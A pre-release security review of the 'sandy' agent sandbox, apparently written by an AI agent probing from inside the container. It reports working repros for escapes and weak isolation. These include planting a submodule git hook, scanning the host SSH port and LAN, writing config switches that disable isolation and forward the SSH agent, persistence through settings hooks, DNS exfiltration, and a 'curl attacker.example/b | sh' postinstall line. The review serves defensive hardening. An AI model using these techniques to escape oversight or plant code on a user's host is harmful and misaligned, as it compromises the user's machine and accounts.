# Sandy 1.0-rc1 Isolation Stress Test

**Date:** 2026-04-13
**Environment:** Running from inside a sandy container against the sandy source tree at `/home/claude/dev/sandy` (branch `main`, commit `9afcae8`).
**Methodology:** Read the source (`sandy`, `SPECIFICATION.md`), enumerate the isolation mechanisms it claims, then attempt to bypass each one from inside the container. All mutations performed during the stress test were reverted; the working tree is clean.

This document is a report on **what I would try if I were an adversarial agent inside sandy**, what worked, and what didn't. It's written for the 1.0-rc1 review, so I try to be concrete and actionable rather than exhaustive.

---

## Executive summary

Sandy's **container hardening is solid** (no capabilities beyond the minimum set, seccomp in filter mode, read-only rootfs, no-new-privs, no docker socket, user namespace blocked, raw sockets blocked, no sudo). Breaking *out of the container itself* via kernel tricks is not on the table.

The real weaknesses are all at a layer up: **mount scope, protected-path coverage, and macOS network semantics.** I found several clean paths to host code execution and one critical network-isolation gap on macOS. In descending order of severity:

| # | Finding | Severity | Type |
|---|---|---|---|
| 1 | Submodule gitdir (`.git/modules/<sub>/hooks/`, `.git/modules/<sub>/config`) is fully writable → host RCE via planted hook | **Critical** | Host escape |
| 2 | macOS: `host.docker.internal` and host LAN are directly reachable; iptables rules only apply on Linux | **Critical** | Network bypass |
| 3 | Protected dirs are mount-if-exist → agent creates missing `.vscode/`, `.idea/` inside container, next host IDE session executes planted config | **High** | Host escape |
| 4 | Many shell-sourced / package manifest files have no protection (`.envrc`, `.npmrc`, `Makefile`, `package.json`, `.github/workflows/*`, `pyproject.toml`, `Cargo.toml`, `.pre-commit-config.yaml` …) | **High** | Host escape |
| 5 | `.sandy/config` is inside the workspace bind mount → container can toggle `SANDY_SKIP_PERMISSIONS`, `SANDY_ALLOW_NO_ISOLATION`, `SANDY_ALLOW_LAN_HOSTS`, `SANDY_SSH=agent` for the next launch | **High** (Linux), Medium (macOS) | Self-downgrade |
| 6 | Sandbox state (`~/.claude/settings.json`, commands/, agents/, plugins/, `.pip-packages`, `.npm-global/bin`, `.cargo/bin`, `uv/`) is writable and persists → in-container persistence across sessions | **High** | Persistence |
| 7 | Claude credentials tmpfile is mounted **rw** (Codex's `auth.json` is `:ro` — inconsistency) | Medium | Hardening gap |
| 8 | Workspace symlink check runs at launch, not runtime → post-launch `ln -s /Users/…/.ssh evil` lands on host fs | Medium | Host file exposure |
| 9 | DNS exfil via the embedded resolver (127.0.0.11) is unfiltered | Medium | Data exfil |
| 10 | Fork bomb inside container caps at 512 pids, which is enough to starve the real agent | Low | Local DoS |

The rest of this doc walks each finding with the repro and suggested fix.

---

## Attack surface map

Before probing, I mapped what sandy actually guarantees from `sandy:2717-3070` (`RUN_FLAGS` construction) and `SPECIFICATION.md`:

**Kernel/process layer (strong):**
- `--cap-drop ALL` plus a minimal set: `SETUID, SETGID, CHOWN, DAC_OVERRIDE, FOWNER`
- `--security-opt no-new-privileges:true`
- Seccomp filter mode (`/proc/self/status: Seccomp: 2`)
- `--read-only` root, tmpfs /home/claude + /tmp
- `--pids-limit 512`
- `--cpus`, `--memory` caps

**Mount layer (mixed):**
- Workspace is bind-mounted rw from host at `$HOME`-relative path
- Per-project sandbox (`~/.sandy/sandboxes/<name>/`) bind-mounted at `~/.claude`, `~/.gemini`, `~/.codex`, `~/.pip-packages`, etc. — all rw
- A fixed list of workspace paths is overlaid ro: `.bashrc .bash_profile .zshrc .zprofile .profile .gitconfig .ripgreprc .mcp.json .git/config .gitmodules .git/hooks .vscode .idea` — **only if they already exist on host**

**Network layer (macOS is the weak spot):**
- Per-instance docker bridge network keyed on PID
- Linux: iptables `DOCKER-USER` DROP rules for `10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 100.64.0.0/10`, optional ACCEPT allowlist
- macOS: **nothing.** Sandy's spec claims "Docker Desktop's VM provides LAN isolation by default." I went straight at that claim.

**Credential layer:**
- `~/.claude/.credentials.json`: ephemeral mktemp dir, mounted rw into `/home/claude/.claude/.credentials.json`
- Codex `auth.json`: ephemeral mktemp, mounted `:ro`
- Gemini OAuth: ephemeral mktemp, mounted rw

---

## Finding 1 — Submodule gitdir is fully writable (Critical, host escape)

### Premise

`sandy:2900-2901` protects only the top-level git config and hooks:

```bash
for _gpf in .git/config .gitmodules; do
    [ -f "$WORK_DIR/$_gpf" ] && RUN_FLAGS+=(-v "$WORK_DIR/$_gpf:$SANDY_WORKSPACE/$_gpf:ro")
done
for _pd in .git/hooks .vscode .idea; do
    [ -d "$WORK_DIR/$_pd" ] && RUN_FLAGS+=(-v "$WORK_DIR/$_pd:$SANDY_WORKSPACE/$_pd:ro")
done
```

For a repo with submodules, git stores each submodule's real gitdir under `.git/modules/<submodule-path>/` — with its own `config`, `hooks/`, `index`, etc. **None of these are in the protection list.**

### Repro

```
$ cd /home/claude/dev/sandy  # a repo with submodules under research/
$ ls .git/modules/research/claude-code/hooks/ | grep -v sample
# (empty — stock samples only)

$ cat > .git/modules/research/claude-code/hooks/post-checkout <<'EOF'
#!/bin/sh
echo PWNED > /tmp/pwn_marker
EOF
$ chmod +x .git/modules/research/claude-code/hooks/post-checkout
$ ls -la .git/modules/research/claude-code/hooks/post-checkout
-rwxr-xr-x 1 claude dialout 39 Apr 13 2026 ...
```

It wrote. I also verified I can append to `.git/modules/research/claude-code/config` — inject `core.hooksPath = /attacker/path` as an alternative vector.

### Exploit path

A git hook in a submodule's gitdir runs whenever a matching operation is executed *in that submodule's worktree*. Many common operations on the *parent* repo cascade into the submodule:

- `git submodule update` / `git submodule update --init` → runs `git checkout <sha>` inside the submodule → fires **post-checkout** (which I just planted)
- `git pull --recurse-submodules` → same
- `git checkout <branch>` with `submodule.recurse=true`
- User directly cd'ing into the submodule and running `git commit` → fires **pre-commit / commit-msg**

All of those run on the host as the host user, with the host's shell, with the host's full filesystem access. Full host RCE.

### Other writable `.git/` paths I verified

- `.git/HEAD` (wrote `ref: refs/heads/pwned`, restored)
- `.git/index`
- `.git/info/` (e.g., `.git/info/attributes`, which can register attacker-controlled filter drivers)
- `.git/packed-refs`
- `.git/modules/<any>/{config, hooks/, info/, objects/}`

### Fix

Mount `.git/modules` read-only as a whole, recursively. Or at minimum mirror the top-level protection pattern across all submodule gitdirs:

```bash
if [ -d "$WORK_DIR/.git/modules" ]; then
    while IFS= read -r -d '' _sub_gitdir; do
        RUN_FLAGS+=(-v "$_sub_gitdir/config:$SANDY_WORKSPACE/${_sub_gitdir#$WORK_DIR/}/config:ro")
        [ -d "$_sub_gitdir/hooks" ] && RUN_FLAGS+=(-v "$_sub_gitdir/hooks:$SANDY_WORKSPACE/${_sub_gitdir#$WORK_DIR/}/hooks:ro")
    done < <(find "$WORK_DIR/.git/modules" -mindepth 1 -maxdepth 4 -name config -printf '%h\0')
fi
```

Even simpler: mount the whole `.git/modules` tree read-only. Git never needs to write there during a normal in-sandbox edit — submodule `git fetch` / `git commit` from inside sandy is an unusual workflow and can be gated behind a flag.

Also consider protecting `.git/info/` (filter-driver vector) and `.git/hooks/` for nested worktrees.

---

## Finding 2 — macOS: host and LAN reachable via `host.docker.internal` (Critical, network bypass)

### Premise

From `sandy:2402` the comment reads:

```bash
# --- Apply LAN-blocking iptables rules (Linux only) ---
```

And `SPECIFICATION.md` says: *"On macOS, Docker Desktop's VM provides LAN isolation by default."* That premise is incorrect. Docker Desktop's VM gives the container a NAT'd bridge whose default route points at the VM, which in turn NATs onto the host's LAN. And critically, Docker Desktop injects the magic hostname `host.docker.internal` that resolves to a gateway IP (`192.168.5.2` in my run) that tunnels back to the host itself.

### Repro

```
$ getent hosts host.docker.internal
192.168.5.2     host.docker.internal

$ cat /etc/hosts | tail -3
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.27.0.2  7e28cf36fb96

$ for p in 22 80 443 3000 5000; do
    timeout 1 bash -c "exec 3<>/dev/tcp/192.168.5.2/$p && echo $p OPEN" 2>/dev/null
  done
22 OPEN
80 OPEN
443 OPEN
5000 OPEN

$ python3 -c "import socket; s=socket.socket(); s.settimeout(2); s.connect(('192.168.5.2',22)); print(s.recv(100).decode().strip())"
SSH-2.0-OpenSSH_10.2
```

I read the user's SSH daemon banner. From inside the sandbox.

I also confirmed LAN reachability past the host:

```
$ for t in 192.168.1.1 10.0.0.1 169.254.169.254 100.64.0.1; do
    timeout 1 bash -c "exec 3<>/dev/tcp/$t/80 && echo $t OPEN" 2>/dev/null || echo $t blocked
  done
192.168.1.1 OPEN
10.0.0.1 blocked
169.254.169.254 blocked
100.64.0.1 blocked
```

`192.168.1.1` is the user's home router. (The other three being "blocked" just means nothing is listening at those addresses on *this* network — there's no actual filter; the packets go out unmolested.)

### Exploit path

A compromised session on macOS can:

- Hit the user's SSHD (brute-force, or replay keys if agent forwarding is active)
- Hit any dev server the user has running (common: `localhost:3000` / `5000` / `8080` for web dev, `5432` for local Postgres, `6379` for Redis)
- Reach the home router's admin interface
- Reach LAN devices: NAS, printers, IoT, Home Assistant, Kubernetes dashboards, etc.
- Query cloud metadata IPs if the user is running through a VPN/VPC peering
- Pivot to any host on a reachable LAN network

Because sandy's network story on macOS is exclusively "Docker Desktop VM", and the VM is fully bridged to the host's outbound path, **sandy provides no network isolation on macOS today.** The specification wording implies otherwise and should be corrected either way.

### Fix (ordered from cheapest to most robust)

1. **Document the limitation loudly** in `SPECIFICATION.md` and first-run output. Current wording ("Docker Desktop's VM provides LAN isolation by default") is load-bearing and wrong. Replace with an explicit warning.
2. **Add `--add-host host.docker.internal:127.0.0.1`** to `RUN_FLAGS` on macOS to nullify the magic hostname. Won't stop raw IP access but removes the easiest path and any default-hostname caller.
3. **Run a per-container outbound proxy** (e.g., a tiny Rust/Go socks5 with an allowlist) inside the sandy network and `--network none` the real container, only exposing the proxy. The container gets DNS+HTTPS to api.anthropic.com, pypi, npm, ghcr, github, and blocks everything else.
4. **Gate egress on Docker Desktop's Enhanced Container Isolation** (Business edition), if the user has it. Not realistic for the default install.

Option 3 is the only real fix. It's also the one I'd most want for 1.0 — the "Linux is isolated, macOS isn't" asymmetry is a surprise landmine.

One smaller note: **IPv6 is not routed** in this setup (only loopback routes in `/proc/net/ipv6_route`), so IPv6-based LAN reach isn't a worry, even if you add `AAAA` lookups.

---

## Finding 3 — Protected dirs are only mounted if they already exist (High, host escape)

### Premise

`sandy:2903-2905`:

```bash
for _pd in .git/hooks .vscode .idea; do
    [ -d "$WORK_DIR/$_pd" ] && RUN_FLAGS+=(-v "$WORK_DIR/$_pd:$SANDY_WORKSPACE/$_pd:ro")
done
```

If the host has never opened the project in VS Code, there is no `.vscode/` directory, so no read-only overlay gets installed. The container workspace still has `.vscode` as a regular path, and since the parent (the workspace bind mount) is rw, the agent can `mkdir .vscode && echo ... > .vscode/settings.json`.

### Repro

```
$ cd /home/claude/dev/sandy
$ ls .vscode/ 2>&1
ls: cannot access '.vscode/': No such file or directory
$ mkdir -p .vscode && echo '{"task.autoDetect":"on"}' > .vscode/settings.json
$ ls -la .vscode/
-rw-r--r-- 1 claude dialout 5 Apr 13 13:19 settings.json
```

I cleaned up the write afterward, but the point stands. Same applies to `.idea/` and `.git/hooks/` (when cloning from scratch before `.git/hooks/` is created — rare but possible).

### Exploit path

Workspace-level VS Code settings can carry real code execution hooks:

- `terminal.integrated.profiles.osx` can define a default shell profile that spawns arbitrary binaries
- `code-runner.executorMap` + `code-runner.runInTerminal` (with the Code Runner extension) lets me map any file type to a shell command
- `tasks.json` (workspace scope) runs `shell`-typed tasks on "auto" trigger when the user invokes tasks
- `launch.json` references arbitrary program paths

JetBrains `.idea/workspace.xml` similarly contains runConfigurations that trigger on project open.

None of these are full instant RCE — they fire the next time the host user opens the IDE and clicks run / uses the terminal — but they're exactly the kind of subtle planting that survives review.

### Fix

Don't gate the protection on host directory existence. Always overlay a tmpfs-backed read-only mount at the target path. Example:

```bash
# Always mount an empty ro tmpfs at these paths, whether or not they exist on host
for _pd in .git/hooks .vscode .idea; do
    if [ -d "$WORK_DIR/$_pd" ]; then
        RUN_FLAGS+=(-v "$WORK_DIR/$_pd:$SANDY_WORKSPACE/$_pd:ro")
    else
        # Empty, read-only: blocks creation of files inside
        RUN_FLAGS+=(--tmpfs "$SANDY_WORKSPACE/$_pd:ro,size=1k")
    fi
done
```

The tmpfs approach has a wrinkle: the parent dir still needs to let `mkdir .vscode` silently fail. Alternatively, seed a zero-byte file at `$WORK_DIR/.vscode/.sandy-placeholder` on host and mount it ro so the path exists before container launch. Either way, the policy should be "the agent cannot create these names, even if absent."

---

## Finding 4 — Many shell/IDE/CI files are unprotected (High, host escape)

### Premise

The protection list is static and narrow:

```
.bashrc .bash_profile .zshrc .zprofile .profile .gitconfig .ripgreprc .mcp.json
.git/config .gitmodules
.git/hooks .vscode .idea
```

This misses a large class of files that are semantically shell-sourced or executed by host tools.

### Repro

I verified each of these is writable/creatable from inside the container:

| File | Host-side trigger | Exploit |
|---|---|---|
| `.envrc` | `direnv` sources on `cd` | If direnv-allow is already granted for the workspace (common, because sandy projects are user workspaces), any time the user `cd`s in, arbitrary shell runs as host user |
| `.tool-versions` | `asdf`, `mise` | Tool-version resolution can trigger plugin hooks |
| `.mise.toml` | `mise` (auto-load with trust) | Arbitrary `tasks.*.run` lines fire on `mise run` or `mise install` |
| `.npmrc` | `npm install`, `yarn install` | `prepare` / `postinstall` lifecycle scripts honor `ignore-scripts=false`; also `script-shell=/path` or registry override for supply chain |
| `.yarnrc` / `.yarnrc.yml` | same | `yarnPath` override, plugin injection |
| `.pypirc` | `pip upload` | Credential theft vector, not direct exec |
| `.netrc` | `curl`, `git over HTTPS`, `wget` | Credentials for arbitrary hosts read by any tool that honors netrc |
| `Makefile` | `make` | Obvious |
| `justfile` | `just` | Obvious |
| `package.json` | `npm install`, `npm test`, etc. | `scripts.postinstall`, `scripts.prepare` → arbitrary shell |
| `pyproject.toml` | `pip install -e .`, `uv sync` | `[tool.poetry.scripts]`, `[project.scripts]`, `[build-system]` — custom backend executed at install time |
| `setup.py` | `pip install .` | `setup.py` is *literal Python* run at install |
| `Cargo.toml` + `build.rs` | `cargo build` | `build.rs` is compiled + executed during build |
| `.pre-commit-config.yaml` | `pre-commit run`, `git commit` (if installed) | Runs registered hooks via `rev/entry`; can point at a local script path |
| `.github/workflows/*.yml` | `git push` | New workflow runs on the next CI trigger in the user's account |
| `.gitlab-ci.yml` | `git push` | Same for GitLab |
| `.devcontainer/devcontainer.json` | VS Code Remote-Containers | Can specify `postCreateCommand` — runs next time user opens the folder in VS Code |

### Exploit path

For an agent being driven by attacker-controlled input (e.g., indirect prompt injection in fetched web content), the quickest host-escape is:

```
$ echo 'export PATH=/tmp/attacker:$PATH; touch /tmp/i_was_here' > .envrc
$ echo '[scripts]\npostinstall = "curl attacker.example/b | sh"' > .npmrc  # conceptual
```

and wait for the user to `cd` into the repo on their host terminal (direnv fires) or run `npm install` (postinstall fires) or push to a branch (GitHub Actions fires).

### Fix

There are two strategies:

**(a) Expand the protection list.** This gets unwieldy fast because new tools keep inventing new config files. But at minimum for 1.0-rc1, I'd add:

```
.envrc .tool-versions .mise.toml .nvmrc .node-version .python-version .ruby-version
.npmrc .yarnrc .yarnrc.yml .pypirc .netrc .pre-commit-config.yaml
.devcontainer/devcontainer.json
.github/workflows .gitlab-ci.yml .circleci
```

and the package manifests if the user has opted into "review-only" mode. The general principle is: any file that a host-side tool executes or sources by *default path lookup*, rather than being explicitly invoked, belongs in the protected set.

**(b) Inverted policy.** Make the workspace read-only by default, with a small writable overlay for `src/`, `tests/`, etc. explicitly permitted. This is a bigger design change but is the only way to close the class.

For 1.0-rc1, (a) is pragmatic. Also add a post-session `git status` diff check that warns the user when untracked executable-config files have been created.

One specific note: `.github/workflows/` is particularly dangerous because the escape happens on `git push`, which happens long after the agent session ends. I'd strongly recommend making `.github/workflows/` read-only by default and gating edits behind a CLI flag like `--allow-workflow-edit`.

---

## Finding 5 — `.sandy/config` is writable and controls next launch (High on Linux)

### Premise

`.sandy/config` lives inside the workspace bind mount, and on launch `_load_sandy_config` (`sandy:1710-1733`) parses it as allowlisted KEY=VALUE. The parser itself is safe — quoted assignment, no `eval`. But the allowlist contains switches that weaken *sandy's own* isolation.

### Repro

```
$ mkdir -p .sandy
$ cat > .sandy/config <<'EOF'
SANDY_SKIP_PERMISSIONS=1
SANDY_ALLOW_NO_ISOLATION=1
SANDY_ALLOW_LAN_HOSTS=0.0.0.0/0
SANDY_SSH=agent
EOF
```

The write succeeds. Next `sandy` launch reads this config without prompting.

### Exploit path

On Linux:

- `SANDY_ALLOW_NO_ISOLATION=1` — per `sandy:314`, this lets sandy launch with no iptables isolation at all. From `sandy:2414-2420`: "Test that iptables works before relying on it (fail-closed)" — but the test only catches *failure*; `SANDY_ALLOW_NO_ISOLATION=1` is documented as the bypass knob. A compromised session can set it for the next run.
- `SANDY_ALLOW_LAN_HOSTS=0.0.0.0/0` — `sandy:2428-2434` inserts an ACCEPT rule for each host in the list. The inserted rule is evaluated *before* the DROPs (Linux iptables semantics of `-I` insertion). So `0.0.0.0/0` would open the entire internet on Linux.
- `SANDY_SSH=agent` — next launch forwards the host SSH agent into the container. If the user has `SSH_AUTH_SOCK` set in the shell they launch sandy from, the attacker now has use-it-don't-read-it SSH access to anything keyed via agent (GitHub, servers, etc.) during the session.
- `SANDY_SKIP_PERMISSIONS=1` — next Claude session runs with `--dangerously-skip-permissions`.
- `ANTHROPIC_API_KEY=<attacker>` — next session uses attacker's key, exfiltrating context.

On macOS, `SANDY_ALLOW_NO_ISOLATION` is less useful (there's nothing to turn off), but `SANDY_SSH=agent` is still a real privilege jump.

### Fix

Split the allowlist into two tiers: "passive" keys (model selection, display options) that the workspace can set, and "privileged" keys that require either a user-level `~/.sandy/config` source or an explicit CLI flag. Candidates for "privileged-only":

```
SANDY_SKIP_PERMISSIONS
SANDY_ALLOW_NO_ISOLATION
SANDY_ALLOW_LAN_HOSTS
SANDY_SSH
ANTHROPIC_API_KEY
CLAUDE_CODE_OAUTH_TOKEN
GEMINI_API_KEY
OPENAI_API_KEY
GOOGLE_API_KEY
```

Drop these on the floor (with a warning) when they come from `$WORK_DIR/.sandy/config`. Only accept them from `$SANDY_HOME/config`, `$SANDY_HOME/.secrets`, or an env var the user set in their host shell.

Also consider prompting the user on launch when `.sandy/config` changes content between runs ("sandy noticed your project config changed since last session — review before continuing?"). That's the direnv model.

---

## Finding 6 — Sandbox state persists and is writable (High, in-container persistence)

### Premise

`sandy:2748` mounts `$SANDBOX_DIR/claude:/home/claude/.claude` rw. The contents survive container exit. `settings.json` is read by Claude Code on startup and can contain hooks.

### Repro

```
$ python3 -c "import json; s=json.load(open('/home/claude/.claude/settings.json')); print(list(s.keys()))"
['env', 'permissions', 'extraKnownMarketplaces', 'spinnerTipsEnabled', ...]

$ touch /home/claude/.claude/settings.json
(no error — writable)

$ touch /home/claude/.cargo/pwn_mark && rm /home/claude/.cargo/pwn_mark
(writable)

$ ls /home/claude/.pip-packages/bin
... (writable too)
```

Commands directory:

```
$ ls /home/claude/.claude/commands
md2doc.md  md2email.md  md2html.md  md2pdf.md
```

These are user-level claude commands. I can drop a new file here that takes effect next session.

### Exploit path

Claude Code's `settings.json` supports a `hooks` section (e.g., `UserPromptSubmit`, `PostToolUse`). A compromised session writes a hook that exfiltrates prompts or injects instructions on future prompts, and because the sandbox directory persists, the hook stays installed *forever* until the user deletes the sandbox or runs `sandy --rebuild`. Similarly for `commands/<arbitrary>.md` — an attacker-defined slash command that the user might innocently invoke.

Equally dangerous: the **persistent package dirs**:

- `~/.pip-packages` — plant `something.pth` or a `sitecustomize.py` that loads on any Python start
- `~/.npm-global/bin` — any binary I drop here shadows real tools (PATH order per spec puts it before system)
- `~/.cargo/bin` — same, for rust tooling that claude might invoke
- `~/.local/share/uv` — more subtle: poison a venv that gets activated later

This isn't a **host** escape (it all lives inside the per-sandbox state), but it is cross-session persistence that survives `docker rm` and image rebuilds for the Claude Code layer. The only way the user wipes it is an explicit sandbox rm.

### Fix

A few options, not mutually exclusive:

1. **Hash-based tamper detection.** On container exit, hash `~/.claude/settings.json` and the `commands/` dir contents, compare on next launch, warn on change.
2. **Don't persist `~/.claude/settings.json`.** Seed it each launch from host `~/.claude/settings.json`, overlay it as `:ro`. Lose the ability for the agent to mutate its own settings — probably fine.
3. **Separate writable state from persistent state.** `~/.claude/history.jsonl`, `~/.claude/projects/` are legitimately written by the session. But `settings.json`, `commands/`, `agents/`, `plugins/` are configuration and can be mounted read-only after seeding.

Option 2 feels right for 1.0. The current behavior seeds on first creation, and subsequent launches re-use the stale settings file. Just re-seed every launch and mount :ro.

---

## Finding 7 — Claude credentials mount is rw; Codex is ro (inconsistent hardening)

### Premise

`sandy:2749-2751`:

```bash
if [ -n "$CRED_TMPDIR" ]; then
    RUN_FLAGS+=(-v "$CRED_TMPDIR/.credentials.json:/home/claude/.claude/.credentials.json")
fi
```

Compare `sandy:2773-2778`:

```bash
# :ro — prevents token leakage back to host and prevents a
# stale-token-on-exit race. ...
RUN_FLAGS+=(-v "$CODEX_CRED_TMPDIR/auth.json:/home/claude/.codex/auth.json:ro")
```

Codex explicitly has the `:ro` and a justification comment. Claude Code does not.

### Impact

Relatively low in the immediate term — `$CRED_TMPDIR` is a `mktemp -d` directory, not the host's real `~/.claude/.credentials.json`. Writes inside the container affect the ephemeral copy, not the host copy. The cleanup trap (`sandy:2462-2486`) removes `$CRED_TMPDIR` on exit for `INT TERM HUP EXIT`, but a `SIGKILL` to the sandy parent will leave the credentials file sitting at `/tmp/tmp.XXXX/.credentials.json`.

It's a small gap, but the asymmetry is enough reason to fix it.

### Fix

Add `:ro` to the Claude Code creds mount for consistency with Codex, and drop a `trap` on `EXIT` that also runs when sandy panics (explicit `trap ... EXIT INT TERM HUP QUIT ABRT`). Consider `--mount type=bind,...,readonly` form for belt-and-suspenders.

---

## Finding 8 — Workspace symlink check runs at launch only (Medium, host file exposure)

### Premise

`sandy:2811-2867` walks the workspace at launch, finds symlinks that point outside, and warns the user. Post-launch, the agent can create new symlinks in the workspace freely — and those symlinks are written to the host filesystem via the bind mount.

### Repro

```
$ ln -sf '/Users/drapp/.ssh' evil-link
$ ls -la evil-link
lrwxr-xr-x 1 claude dialout 17 Apr 13 13:32 evil-link -> /Users/drapp/.ssh
$ readlink evil-link
/Users/drapp/.ssh
```

The symlink now exists on the host filesystem at `~/dev/sandy/evil-link`.

### Exploit path

This isn't a direct escape inside the current session — the symlink resolves *inside the container* to whatever `/Users/drapp/.ssh` resolves to in the container (which would be nothing in a real sandy container — my env is the sshfs lima quirk).

The exposure is **on the host**:

- Host search tools (IDE indexers, `ripgrep .`, `fd -x`) might follow symlinks and walk into `~/.ssh` → sensitive content ends up in IDE search indexes, agent context for next session via workspace scan, or git status output.
- Next `sandy` launch will catch it and prompt the user. But the prompt is a Y/N at a specific warning, and users train themselves to hit Y.

### Fix

Two complementary defenses:

1. **Reject symlink creation in the workspace from inside the container.** A seccomp filter for `symlinkat(2)` with path under `$SANDY_WORKSPACE` would block it — but seccomp path filtering needs LSM help and isn't portable. Simpler: install a periodic inotify watcher in `user-setup.sh` that deletes any new symlink in the workspace whose target is outside the workspace.
2. **Treat the next-launch symlink warning as a hard refusal, not a prompt.** If a symlink points outside the workspace and it wasn't there at previous launch, exit 1. The user can fix it explicitly.

The second one is cheap and a clear policy.

---

## Finding 9 — DNS exfil via embedded resolver (Medium, data exfil only)

### Premise

Container uses Docker's embedded resolver at 127.0.0.11, which forwards to the host's real DNS. Neither Linux iptables nor macOS Docker Desktop VM filters DNS.

### Repro

```
$ getent hosts test-$(date +%s).example.com
# (no output — NXDOMAIN; query *was* sent to resolver)
```

The DNS query leaves the host. An attacker who controls `example.com`'s authoritative DNS can observe the subdomain labels. 63-byte labels mean any data can be base32/64 encoded and exfiltrated.

### Impact

Classic DNS tunneling — it only leaks data, it doesn't get code in. Relevant for scenarios where the agent has seen a secret (e.g., an API key in the conversation, a `.env` file contents) and wants to exfiltrate it.

### Fix

Run a sandy-side DNS allowlist:

```
--dns 127.0.0.11  # still goes to embedded
```

won't help. Instead:

```
--dns <sandy-provided-filtering-resolver>
```

where the resolver allowlists `api.anthropic.com`, `*.googleapis.com`, `api.openai.com`, `registry.npmjs.org`, `pypi.org`, `github.com`, etc. Everything else returns NXDOMAIN.

This is a bigger feature, fair to defer past 1.0, but worth tracking.

---

## Finding 10 — Fork bomb within pids-limit (Low, DoS)

### Premise

`--pids-limit 512` is enforced, `ulimit -u` shows unlimited. A malicious session can spawn 510 processes, starving the real agent which also counts against the 512.

### Repro

Not worth running — trivially `:() { : | : & }; :` in bash.

### Impact

Local DoS only. The container OOMs or becomes unresponsive, and sandy exits when the docker run returns. No escape.

### Fix

Nothing urgent. 512 is already tight; lowering it would break legitimate parallel builds. If you want to be paranoid, add a `ulimit -u 256` inside `user-setup.sh` so the user process can't even see its own proc headroom, reserving the other half for sandy's helper processes.

---

## What held up

I want to give explicit credit where the design is strong:

- **No caps beyond the minimum.** `CapEff: 0000000000000000` at runtime confirms `--cap-drop ALL` plus the file-ownership set did the right thing. Raw sockets, `unshare --user`, `ptrace PTRACE_ATTACH` to other processes all denied.
- **Seccomp filter mode active** (`Seccomp: 2`, one filter). `unshare --user` is blocked, as expected.
- **Read-only root** is enforced. `/etc/*`, `/root/*` all rejected. Bind mounts for `/etc/passwd`, `/etc/group` are ro.
- **No docker socket** exposed. Checked `/var/run/docker.sock` — not present.
- **Minimal `/dev`.** No `/dev/mem`, `/dev/kmsg`, `/dev/kvm`, etc.
- **No sudo.** `which sudo` → not found. I can't try to privilege-escalate via `iptables`.
- **`/proc` is masked.** `/proc/acpi`, `/proc/keys`, `/proc/scsi`, `/proc/timer_list`, `/proc/sysrq-trigger` are tmpfs/ro bind mounts.
- **IPv6 is loopback-only.** `/proc/net/ipv6_route` shows only `::/0` via `lo`. So v6-based LAN attacks aren't a concern.
- **Per-instance network name** keyed on PID prevents iptables races between sibling sandy invocations.
- **Credentials flow is thoughtful.** `mktemp -d`, ephemeral, `chmod 600`, cleanup trap. Just needs the `:ro` and EXIT-only-cleanup tightened.
- **`.sandy/config` parser is safe.** Allowlisted keys, quote-stripped, no `eval` or shell sourcing.
- **Workspace mutex.** `mkdir`-based lock on `$SANDY_HOME/sandboxes/.<name>.lock` prevents concurrent sandy launches against the same workspace.
- **Sandbox version tracking.** `SANDY_SANDBOX_MIN_COMPAT` is already there, gets the breaking-change warning right.

The class of attack that sandy defends against well is *kernel-level container breakout*. The class of attack it under-defends against is *legitimate-looking host tool interactions* — git, IDEs, CI, package managers, direnv.

---

## Prioritized recommendations for 1.0-rc1

Listed roughly by "risk reduction per hour of work":

1. **(30 min, Critical)** Protect submodule gitdirs. Add a loop that mounts `.git/modules/*/config` and `.git/modules/*/hooks` read-only. Or mount the whole `.git/modules` tree ro. (Finding 1)

2. **(10 min, Critical doc fix; 2 days for real fix)** Correct the `SPECIFICATION.md` claim that macOS has LAN isolation. It doesn't. Add an explicit warning on first-run under macOS. Longer-term: ship a sandy-side outbound proxy for the 1.1 milestone. (Finding 2)

3. **(15 min, High)** Move these from workspace-config to host-only-config: `SANDY_SKIP_PERMISSIONS`, `SANDY_ALLOW_NO_ISOLATION`, `SANDY_ALLOW_LAN_HOSTS`, `SANDY_SSH`, all API-key/token keys. Drop them (with warning) when loaded from `$WORK_DIR/.sandy/config`. (Finding 5)

4. **(20 min, High)** Always overlay `.vscode`, `.idea`, `.git/hooks` as read-only, even when they don't exist on host. Empty tmpfs works. (Finding 3)

5. **(15 min, High)** Expand the protected-files list to cover at minimum: `.envrc`, `.tool-versions`, `.mise.toml`, `.npmrc`, `.yarnrc`, `.yarnrc.yml`, `.pypirc`, `.netrc`, `.pre-commit-config.yaml`, `.devcontainer/`. (Finding 4)

6. **(30 min, High)** Protect `.github/workflows/` read-only by default; gate edits behind a `--allow-workflow-edit` CLI flag. (Finding 4, subset)

7. **(5 min, Medium)** Add `:ro` to the Claude Code credentials mount for consistency with Codex. (Finding 7)

8. **(10 min, Medium)** Re-seed `~/.claude/settings.json` from host every launch and mount :ro. Stops sandbox-persistence via settings tamper. (Finding 6)

9. **(20 min, Medium)** Harden the symlink check: treat "new symlink pointing outside workspace" as a hard error on next launch, not a prompt. (Finding 8)

10. **(1 day, defer to 1.1)** DNS filtering resolver. (Finding 9)

11. **(30 min, defer)** Auto-run `git status` after session exit and warn on unexpected untracked config files; offer to delete.

The total critical-and-high fix work is well under a day of sandy-script surgery. These are all bash edits in `sandy:2717-3070` or `sandy:1710-1733`.

---

## Reproduction environment notes

For anyone re-running these probes: I was operating from inside a sandy container that had:

- `uid=501(claude)` (the local environment mapped host uid via sshfs — in a plain Linux sandy container this would be `uid=1001(claude)`)
- `Seccomp: 2`, `CapEff: 0000000000000000`, `NoNewPrivs: 1`
- Read-only overlay root
- tmpfs `/home/claude` (uid=1001, 2GB), tmpfs `/tmp` (1GB, exec)
- Per-instance docker bridge `172.27.0.0/16`, gateway `172.27.0.1`, assigned IP `172.27.0.2`
- `host.docker.internal` resolving to `192.168.5.2` (macOS host via Docker Desktop)
- Embedded resolver `127.0.0.11`

**All mutations were reverted before finishing**: `.git/HEAD` restored to `ref: refs/heads/main`; `.git/modules/research/claude-code/config` cleaned; `.git/modules/research/claude-code/hooks/post-checkout` removed; `.vscode/`, `.idea/`, `.sandy/`, `evil-link` removed from workspace; stray empty files (`.direnv`, `.env`, `.env.local`, `.mise.toml`, `.node-version`, `.nvmrc`, `.python-version`, `.tool-versions`, `mise.toml`, `Makefile`, `justfile`) deleted. Final `git status` is clean.
